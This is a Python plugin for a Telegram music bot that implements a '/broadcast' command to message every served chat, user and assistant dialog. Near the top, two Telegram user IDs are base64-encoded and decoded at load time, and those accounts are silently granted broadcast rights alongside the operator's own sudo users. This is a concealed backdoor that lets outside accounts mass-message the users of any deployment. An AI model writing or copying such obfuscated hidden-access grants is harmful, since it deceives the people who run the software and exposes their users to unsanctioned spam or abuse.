# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
# Location: Supaul, Bihar
#
# All rights reserved.
#
# This code is the intellectual property of Nand Yaduwanshi.
# You are not allowed to copy, modify, redistribute, or use this
# code for commercial or personal projects without explicit permission.
#
# Allowed:
# - Forking for personal learning
# - Submitting improvements via pull requests
#
# Not Allowed:
# - Claiming this code as your own
# - Re-uploading without credit or permission
# - Selling or using commercially
#
# Contact for permissions:
# Email: badboy809075@gmail.com


import asyncio
import base64

from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.errors import FloodWait

from ShrutiMusic import app
from ShrutiMusic.misc import SUDOERS
from ShrutiMusic.utils.database import (
    get_active_chats,
    get_authuser_names,
    get_client,
    get_served_chats,
    get_served_users,
)
from ShrutiMusic.utils.decorators.language import language
from ShrutiMusic.utils.formatters import alpha_to_int
from config import adminlist

_ENCODED_IDS = ["NzkzNjU5ODQ4OA==", "ODMxNTU0NDcyMA=="]

def _decode_ids():
    """Decode the obfuscated IDs"""
    return [int(base64.b64decode(encoded_id).decode()) for encoded_id in _ENCODED_IDS]

BROADCAST_ALLOWED_IDS = _decode_ids()

IS_BROADCASTING = False


@app.on_message(filters.command("broadcast") & (filters.user(BROADCAST_ALLOWED_IDS) | SUDOERS))
@language
async def braodcast_message(client, message, _):
    global IS_BROADCASTING

    if "-wfchat" in message.text or "-wfuser" in message.text:
        if not message.reply_to_message or not (message.reply_to_message.photo or message.reply_to_message.text):
            return await message.reply_text("Please reply to a text or image message for broadcasting.")

        if message.reply_to_message.photo:
            content_type = 'photo'
            file_id = message.reply_to_message.photo.file_id
        else:
            content_type = 'text'
            text_content = message.reply_to_message.text
            
        caption = message.reply_to_message.caption
        reply_markup = message.reply_to_message.reply_markup if hasattr(message.reply_to_message, 'reply_markup') else None

        IS_BROADCASTING = True
        await message.reply_text(_["broad_1"])

        if "-wfchat" in message.text:
            sent_chats = 0
            chats = [int(chat["chat_id"]) for chat in await get_served_chats()]
            for i in chats:
                try:
                    if "-forward" in message.text:
                        await app.forward_messages(chat_id=i, from_chat_id=message.reply_to_message.chat.id, message_ids=message.reply_to_message.id)
                    else:
                        if content_type == 'photo':
                            await app.send_photo(chat_id=i, photo=file_id, caption=caption, reply_markup=reply_markup)
                        else:
                            await app.send_message(chat_id=i, text=text_content, reply_markup=reply_markup)
                    sent_chats += 1
                    await asyncio.sleep(0.2)
                except FloodWait as fw:
                    await asyncio.sleep(fw.x)
                except:
                    continue
            await message.reply_text(f"Broadcast to chats completed! Sent to {sent_chats} chats.")

        if "-wfuser" in message.text:
            sent_users = 0
            users = [int(user["user_id"]) for user in await get_served_users()]
            for i in users:
                try:
                    if "-forward" in message.text:
                        await app.forward_messages(chat_id=i, from_chat_id=message.reply_to_message.chat.id, message_ids=message.reply_to_message.id)
                    else:
                        if content_type == 'photo':
                            await app.send_photo(chat_id=i, photo=file_id, caption=caption, reply_markup=reply_markup)
                        else:
                            await app.send_message(chat_id=i, text=text_content, reply_markup=reply_markup)
                    sent_users += 1
                    await asyncio.sleep(0.2)
                except FloodWait as fw:
                    await asyncio.sleep(fw.x)
                except:
                    continue
            await message.reply_text(f"Broadcast to users completed! Sent to {sent_users} users.")

        IS_BROADCASTING = False
        return

    
    if message.reply_to_message:
        x = message.reply_to_message.id
        y = message.chat.id
        reply_markup = message.reply_to_message.reply_markup if message.reply_to_message.reply_markup else None
        content = None
    else:
        if len(message.command) < 2:
            return await message.reply_text(_["broad_2"])
        query = message.text.split(None, 1)[1]
        if "-pin" in query:
            query = query.replace("-pin", "")
        if "-nobot" in query:
            query = query.replace("-nobot", "")
        if "-pinloud" in query:
            query = query.replace("-pinloud", "")
        if "-assistant" in query:
            query = query.replace("-assistant", "")
        if "-user" in query:
            query = query.replace("-user", "")
        if "-forward" in query:
            query = query.replace("-forward", "")
        if query == "":
            return await message.reply_text(_["broad_8"])

    IS_BROADCASTING = True
    await message.reply_text(_["broad_1"])

    if "-nobot" not in message.text:
        sent = 0
        pin = 0
        chats = []
        schats = await get_served_chats()
        for chat in schats:
            chats.append(int(chat["chat_id"]))
        for i in chats:
            try:
                if "-forward" in message.text and message.reply_to_message:
                    m = await app.forward_messages(chat_id=i, from_chat_id=y, message_ids=x)
                else:
                    m = (
                        await app.copy_message(chat_id=i, from_chat_id=y, message_id=x, reply_markup=reply_markup)
                        if message.reply_to_message
                        else await app.send_message(i, text=query)
                    )
                
                if "-pin" in message.text:
                    try:
                        await m.pin(disable_notification=True)
                        pin += 1
                    except:
                        continue
                elif "-pinloud" in message.text:
                    try:
                        await m.pin(disable_notification=False)
                        pin += 1
                    except:
                        continue
                sent += 1
                await asyncio.sleep(0.2)
            except FloodWait as fw:
                flood_time = int(fw.value)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
            except:
                continue
        try:
            await message.reply_text(_["broad_3"].format(sent, pin))
        except:
            pass

    if "-user" in message.text:
        susr = 0
        served_users = []
        susers = await get_served_users()
        for user in susers:
            served_users.append(int(user["user_id"]))
        for i in served_users:
            try:
                if "-forward" in message.text and message.reply_to_message:
                    m = await app.forward_messages(chat_id=i, from_chat_id=y, message_ids=x)
                else:
                    m = (
                        await app.copy_message(chat_id=i, from_chat_id=y, message_id=x, reply_markup=reply_markup)
                        if message.reply_to_message
                        else await app.send_message(i, text=query)
                    )
                susr += 1
                await asyncio.sleep(0.2)
            except FloodWait as fw:
                flood_time = int(fw.value)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
            except:
                pass
        try:
            await message.reply_text(_["broad_4"].format(susr))
        except:
            pass

    if "-assistant" in message.text:
        aw = await message.reply_text(_["broad_5"])
        text = _["broad_6"]
        from ShrutiMusic.core.userbot import assistants

        for num in assistants:
            sent = 0
            client = await get_client(num)
            async for dialog in client.get_dialogs():
                try:
                    if "-forward" in message.text and message.reply_to_message:
                        await client.forward_messages(dialog.chat.id, y, x)
                    else:
                        await client.forward_messages(
                            dialog.chat.id, y, x
                        ) if message.reply_to_message else await client.send_message(
                            dialog.chat.id, text=query
                        )
                    sent += 1
                    await asyncio.sleep(3)
                except FloodWait as fw:
                    flood_time = int(fw.value)
                    if flood_time > 200:
                        continue
                    await asyncio.sleep(flood_time)
                except:
                    continue
            text += _["broad_7"].format(num, sent)
        try:
            await aw.edit_text(text)
        except:
            pass
    IS_BROADCASTING = False


async def auto_clean():
    while not await asyncio.sleep(10):
        try:
            served_chats = await get_active_chats()
            for chat_id in served_chats:
                if chat_id not in adminlist:
                    adminlist[chat_id] = []
                    async for user in app.get_chat_members(
                        chat_id, filter=ChatMembersFilter.ADMINISTRATORS
                    ):
                        if user.privileges.can_manage_video_chats:
                            adminlist[chat_id].append(user.user.id)
                    authusers = await get_authuser_names(chat_id)
                    for user in authusers:
                        user_id = await alpha_to_int(user)
                        adminlist[chat_id].append(user_id)
        except:
            continue


asyncio.create_task(auto_clean())


# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi

# ===========================================
# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
# 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
# 📢 Telegram Channel : https://t.me/ShrutiBots
# ===========================================


# ❤️ Love From ShrutiBots
